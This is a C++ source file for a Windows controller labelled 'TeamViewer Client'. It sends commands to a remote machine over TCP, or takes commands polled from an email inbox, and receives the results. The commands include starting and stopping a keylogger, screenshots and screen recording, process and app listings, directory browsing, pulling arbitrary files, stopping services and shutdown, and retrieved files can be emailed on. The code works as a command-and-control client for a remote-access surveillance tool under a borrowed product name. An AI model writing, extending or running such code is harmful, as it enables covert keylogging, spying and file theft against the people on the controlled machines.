#define WIN32_LEAN_AND_MEAN

#include "src/network.h"
#include "src/utils.h"
#include "src/config.h"
#include "src/email_utils.h"
#include "src/email_function.h"
#include "src/ServerManager.h" 

#include <iostream>
#include <string>
#include <sstream>
#include <fstream>
#include <algorithm>
#include <vector>
#include <chrono>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <filesystem>
#include <thread>
#include <curl/curl.h>
#include <atomic>
#include <conio.h> // For _kbhit() and _getch()

#pragma comment(lib, "ws2_32.lib")

namespace fs = std::filesystem;
using namespace std;

enum class ClientMode {
    CONSOLE,
    EMAIL
};

// Global variables - much simplified now
atomic<bool> stopEmailMonitoring(false);
ServerManager* serverManager = nullptr;  // Global instance of ServerManager

bool processEmailCommand();

void displayMenu() {
    system("cls");
    cout << "\n========== TEAMVIEWER CLIENT MENU ==========\n";
    cout << "1. Switch to Email Mode (Current: Console Mode)\n";
    cout << "2. Manage Servers\n";
    cout << "3. Send Command to Server\n";
    cout << "4. View Connection Status\n";
    cout << "5. Quick Connect/Disconnect\n";
    cout << "6. Exit\n";
    cout << "============================================\n";
    
    // Display current connection info using ServerManager
    cout << "Current Server: " << serverManager->getCurrentServerString() << endl;
    cout << "Status: " << (serverManager->isConnected() ? "CONNECTED" : "DISCONNECTED");
    if (!serverManager->getConnectionStatusMessage().empty()) {
        cout << " (" << serverManager->getConnectionStatusMessage() << ")";
    }
    cout << endl;
    cout << "Choose option: ";
}

void displayEmailModeMenu() {
    system("cls");
    cout << "\n========== EMAIL MODE MENU ==========\n";
    cout << "1. Switch to Console Mode (Current: Email Mode)\n";
    cout << "2. Start Email Monitoring (Auto mode)\n";
    cout << "3. Check Email Once\n";
    cout << "4. Exit\n";
    cout << "=====================================\n";
    cout << "Note: In auto monitoring mode, you can type 'stop' to exit\n";
    cout << "Choose option: ";
}

bool waitForInput(string& input, int timeoutSeconds) {
    cout << "Waiting " << timeoutSeconds << " seconds before next check..." << endl;
    cout << "Type 'stop' and press Enter to exit monitoring, or just wait..." << endl;
    cout << "> ";
    
    // Set up for non-blocking input with timeout
    auto start = chrono::steady_clock::now();
    while (chrono::duration_cast<chrono::seconds>(chrono::steady_clock::now() - start).count() < timeoutSeconds) {
        if (_kbhit()) {
            getline(cin, input);
            return true; // User provided input
        }
        this_thread::sleep_for(chrono::milliseconds(100));
    }
    
    cout << "\nTimeout reached, continuing monitoring..." << endl;
    return false; // Timeout, no input
}

void displayCommandMenu() {
    system("cls");
    cout << "\n========== AVAILABLE COMMANDS ==========\n";
    cout << "1. startkeylogger - Start keylogger\n";
    cout << "2. stopkeylogger - Stop keylogger and get log\n";
    cout << "3. screenshot - Take screenshot\n";
    cout << "4. record <duration> - Record screen (seconds)\n";
    cout << "5. listProcess - List running processes\n";
    cout << "6. listApp - List installed applications\n";
    cout << "7. getDxdiag - Get system information\n";
    cout << "8. listDir <directory> - List files/folders in a directory\n";
    cout << "9. getFile <filepath> - Download file from server\n";
    cout << "10. Start <service> - Start a service\n";
    cout << "11. Stop <service> - Stop a service\n";
    cout << "12. Shutdown - Shutdown server\n";
    cout << "13. Reset - Reset server\n";
    cout << "14. Custom command\n";
    cout << "15. Back to main menu\n";
    cout << "=======================================\n";
    
    // Show connection status using ServerManager
    serverManager->displayConnectionStatus();
    cout << "Choose option: ";
}

bool connectToServer(SOCKET& clientSocket, const string& ip, int port) {
    // Create socket
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        cout << "Socket creation failed: " << WSAGetLastError() << endl;
        LogToFile("Socket creation failed: " + to_string(WSAGetLastError()));
        return false;
    }

    // Server address
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip.c_str(), &serverAddr.sin_addr) <= 0) {
        cout << "Invalid server IP address: " << ip << endl;
        LogToFile("Invalid server IP address: " + ip);
        closesocket(clientSocket);
        return false;
    }

    // Connect to server
    if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cout << "Connection failed: " << WSAGetLastError() << endl;
        LogToFile("Connection failed: " + to_string(WSAGetLastError()));
        closesocket(clientSocket);
        return false;
    }

    cout << "Connected to server at " << ip << ":" << port << endl;
    LogToFile("Connected to server at " + ip + ":" + to_string(port));
    return true;
}

string getCommandInput(int choice) {
    string command;
    string parameter;
    
    switch (choice) {
        case 1:
            return "startkeylogger";
        case 2:
            return "stopkeylogger";
        case 3:
            return "screenshot";
        case 4:
            cout << "Enter duration in seconds: ";
            getline(cin, parameter);
            return "record " + parameter;
        case 5:
            return "listProcess";
        case 6:
            return "listApp";
        case 7:
            return "getDxdiag";
        case 8:
            cout << "Enter directory path: ";
            getline(cin, parameter);
            return "listDir " + parameter;
        case 9:
            cout << "Enter file path: ";
            getline(cin, parameter);
            return "getFile " + parameter;
        case 10:
            cout << "Enter service name: ";
            getline(cin, parameter);
            return "Start " + parameter;
        case 11:
            cout << "Enter service name: ";
            getline(cin, parameter);
            return "Stop " + parameter;
        case 12:
            return "Shutdown_Reset shutdown";
        case 13:
            return "Shutdown_Reset reset";
        case 14:
            cout << "Enter custom command: ";
            getline(cin, command);
            return command;
        default:
            return "";
    }
}

bool processCommand(SOCKET clientSocket, const string& command, const string& fromEmail = "") {
    string fileName;
    bool expectFile = false;
    bool isEmailMode = !fromEmail.empty();
    
    // Determine if command expects file response
    if (command == "stopkeylogger" || command == "listProcess" || command == "getDxdiag" || 
        command == "listApp" || command.find("record") == 0 || command.find("screenshot") == 0) {
        expectFile = true;
        if (command.find("record") == 0) {
            fileName = Config::VIDEO_RECEIVED_PATH;
        } else if (command == "stopkeylogger") {
            fileName = Config::KEYLOG_RECEIVED_PATH;
        } else if (command == "listProcess") {
            fileName = Config::PROCESS_LIST_RECEIVED_PATH;
        } else if (command == "getDxdiag") {
            fileName = Config::DXDIAG_RECEIVED_PATH;
        } else if (command == "listApp") {
            fileName = Config::APP_LIST_RECEIVED_PATH;
        } else if (command == "screenshot") {
            fileName = Config::SCREENSHOT_RECEIVED_PATH;
        }
    } else if (command.find("getFile") == 0 ) {
        expectFile = true;
        string parameter = command.substr(8);
        fileName = Config::BASE_DIR + "temp_client/" + getFileName(parameter);
    }
    else if (command.find("listDir") == 0) {
        expectFile = true;
        string parameter = command.substr(8);
        fileName = Config::DIRECTORY_LIST_RECEIVED_PATH;
    }

    // Create and send command file
    CreateCommandFile(command);
    if (!SendFile(clientSocket, Config::COMMAND_FILE_PATH)) {
        cout << "Failed to send command file" << endl;
        LogToFile("Failed to send command file");
        return false;
    }

    if (expectFile) {
        string response;
        bool continueReceiving = true;
        while (continueReceiving) {
            if (!ReceiveResponse(clientSocket, response)) {
                continueReceiving = false;
                break;
            }
            
            response.erase(response.find_last_not_of("\r\n\t ") + 1);
            LogToFile("Checking response: '" + response + "'");
            
            if (isValidNumber(response)) {
                try {
                    size_t fileSize = stoull(response);
                    LogToFile("Expected file size: " + to_string(fileSize));
                    
                    if (ReceiveFile(clientSocket, fileName, fileSize)) {
                        cout << "File received successfully: " << fileName << endl;
                        
                        if (isEmailMode) {
                            // Send via email
                            string access_token;
                            if (getAccessToken(access_token)) {
                                if (sendMail(access_token, fromEmail, convert_backslashes_to_slashes(fileName))) {
                                    cout << "Email sent successfully to " << fromEmail << endl;
                                    LogToFile("Sent email with file: " + fileName + " to " + fromEmail);
                                } else {
                                    cout << "Failed to send email" << endl;
                                    LogToFile("Failed to send email with file: " + fileName);
                                }
                            }
                        } else {
                            // Console mode - just notify file saved
                            cout << "File saved to: " << fileName << endl;
                            cout << "You can find the file at the above location." << endl;
                        }
                    }
                    continueReceiving = false;
                } catch (...) {
                    cout << "Failed to parse file size: " << response << endl;
                    LogToFile("Failed to parse file size: " + response);
                    continueReceiving = false;
                }
            } else {
                cout << "Server response: " << response << endl;
                LogToFile("Server response: " + response);
            }
        }
    } else {
        string response;
        if (ReceiveResponse(clientSocket, response)) {
            cout << "Command executed successfully" << endl;
        }
    }
    
    return true;
}

bool processEmailCommand() {
    string access_token;
    if (!getAccessToken(access_token)) {
        cout << "Unable to get access token\n";
        LogToFile("Unable to get access token");
        return false;
    }

    readMail(Config::EMAIL_CONTENT_PATH, access_token);
    LogToFile("Checked emails");

    string ipPort, command, fromEmail;
    if (!ReadEmailContent(ipPort, command, fromEmail)) {
        cout << "No valid email content found" << endl;
        LogToFile("No valid email content found");
        return false;
    }

    cout << "Email content read: IP:Port = " << ipPort << ", Command = " << command << ", From = " << fromEmail << endl;
    LogToFile("Email content read: IP:Port = " + ipPort + ", Command = " + command + ", From = " + fromEmail);

    // Process shutdown/reset commands from email
    string finalCommand = command;
    if (command == "shutdown") {
        finalCommand = "Shutdown_Reset shutdown";
        cout << "Converted email command 'shutdown' to 'Shutdown_Reset shutdown'" << endl;
        LogToFile("Converted email command 'shutdown' to 'Shutdown_Reset shutdown'");
    } else if (command == "reset") {
        finalCommand = "Shutdown_Reset reset";
        cout << "Converted email command 'reset' to 'Shutdown_Reset reset'" << endl;
        LogToFile("Converted email command 'reset' to 'Shutdown_Reset reset'");
    }

    // Parse IP and port
    size_t colonPos = ipPort.find(':');
    if (colonPos == string::npos) {
        cout << "Invalid IP:port format: " << ipPort << endl;
        LogToFile("Invalid IP:port format: " + ipPort);
        return false;
    }
    
    string ip = ipPort.substr(0, colonPos);
    string portStr = ipPort.substr(colonPos + 1);
    int port;
    try {
        port = stoi(portStr);
    } catch (...) {
        cout << "Invalid port number: " << portStr << endl;
        LogToFile("Invalid port number: " + portStr);
        return false;
    }

    // Connect and process command
    SOCKET clientSocket;
    if (connectToServer(clientSocket, ip, port)) {
        bool result = processCommand(clientSocket, finalCommand, fromEmail);
        closesocket(clientSocket);
        return result;
    }
    
    return false;
}

void runConsoleMode() {
    while (true) {
        displayMenu();
        
        string input;
        getline(cin, input);
        
        if (input.empty()) continue;
        
        int choice;
        try {
            choice = stoi(input);
        } catch (...) {
            cout << "Invalid option. Please try again." << endl;
            cout << "\nPress Enter to continue...";
            cin.get();
            continue;
        }
        
        switch (choice) {
            case 1: // Switch to email mode
                if (serverManager->isConnected()) {
                    serverManager->disconnectFromServer();
                }
                return; // Return to main to switch mode
                
            case 2: // Manage servers
                serverManager->manageServersMenu();
                break;
                
            case 3: { // Send command
                if (!serverManager->isConnected()) {
                    cout << "Not connected to server. Please connect first." << endl;
                    cout << "\nPress Enter to continue...";
                    cin.get();
                    break;
                }
                
                while (true) {
                    displayCommandMenu();
                    getline(cin, input);
                    
                    if (input.empty()) continue;
                    
                    int cmdChoice;
                    try {
                        cmdChoice = stoi(input);
                    } catch (...) {
                        cout << "Invalid option. Please try again." << endl;
                        cout << "\nPress Enter to continue...";
                        cin.get();
                        continue;
                    }
                    
                    if (cmdChoice == 15) { // Back to main menu
                        break;
                    }
                    
                    string command = getCommandInput(cmdChoice);
                    if (!command.empty()) {
                        cout << "Executing command: " << command << endl;
                        processCommand(serverManager->getSocket(), command);
                        cout << "\nPress Enter to continue...";
                        cin.get();
                    } else {
                        cout << "Invalid command option." << endl;
                        cout << "\nPress Enter to continue...";
                        cin.get();
                    }
                }
                break;
            }
                
            case 4: { // View connection status
                system("cls");
                serverManager->displayConnectionStatus();
                cout << "\nPress Enter to continue...";
                cin.get();
                break;
            }
                
            case 5: { // Quick connect/disconnect
                if (serverManager->isConnected()) {
                    serverManager->disconnectFromServer();
                } else {
                    serverManager->connectToSelectedServer();
                }
                cout << "\nPress Enter to continue...";
                cin.get();
                break;
            }
                
            case 6: // Exit
                if (serverManager->isConnected()) {
                    serverManager->disconnectFromServer();
                }
                return;
                
            default:
                cout << "Invalid option. Please try again." << endl;
                cout << "\nPress Enter to continue...";
                cin.get();
        }
    }
}

void runEmailMode() {
    while (true) {
        cout << "Starting email monitoring..." << endl;
        cout << "You can type 'stop' during the waiting period to exit." << endl;
        cout << "Checking emails every 30 seconds..." << endl;
        
        bool continueMonitoring = true;
        while (continueMonitoring) {
            cout << "\n--- Checking for new emails ---" << endl;
            processEmailCommand();
            
            // Wait for 30 seconds or user input
            string userInput;
            if (waitForInput(userInput, 30)) {
                if (userInput == "stop" || userInput == "STOP") {
                    cout << "Stopping email monitoring..." << endl;
                    continueMonitoring = false;
                } else {
                    cout << "Unknown command. Type 'stop' to exit monitoring." << endl;
                }
            }
        }
        
        cout << "Email monitoring stopped. Returning to menu..." << endl;
        cout << "\nPress Enter to continue...";
        cin.get();
        return;
    }
}

int main(void) {
    // Initialize curl
    CURLcode curlInitRes = curl_global_init(CURL_GLOBAL_ALL);
    if (curlInitRes != CURLE_OK) {
        cout << "curl_global_init() failed: " << curl_easy_strerror(curlInitRes) << endl;
        LogToFile("curl_global_init() failed: " + string(curl_easy_strerror(curlInitRes)));
        return 1;
    }

    // Create temp directory
    fs::create_directories(Config::BASE_DIR + "temp_client/");

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cout << "WSAStartup failed: " << WSAGetLastError() << endl;
        LogToFile("WSAStartup failed: " + to_string(WSAGetLastError()));
        curl_global_cleanup();
        return 1;
    }
    
    // Initialize ServerManager
    serverManager = new ServerManager();
    
    cout << "========== TEAMVIEWER CLIENT ==========\n";
    cout << "Welcome to TeamViewer Client!\n";
    // cout << "You can switch between Console mode and Email mode.\n";
    cout << "=====================================\n";
    
    LogToFile("Client started");
    
    ClientMode currentMode = ClientMode::EMAIL;
    
    while (true) {
        currentMode = ClientMode::EMAIL;
        cout << "\n--- Entering Email Mode ---\n";
        runEmailMode();
        break;
    }

    // This should never be reached, but just in case
    delete serverManager;
    WSACleanup();
    curl_global_cleanup();
    LogToFile("Client exited");
    return 0;
}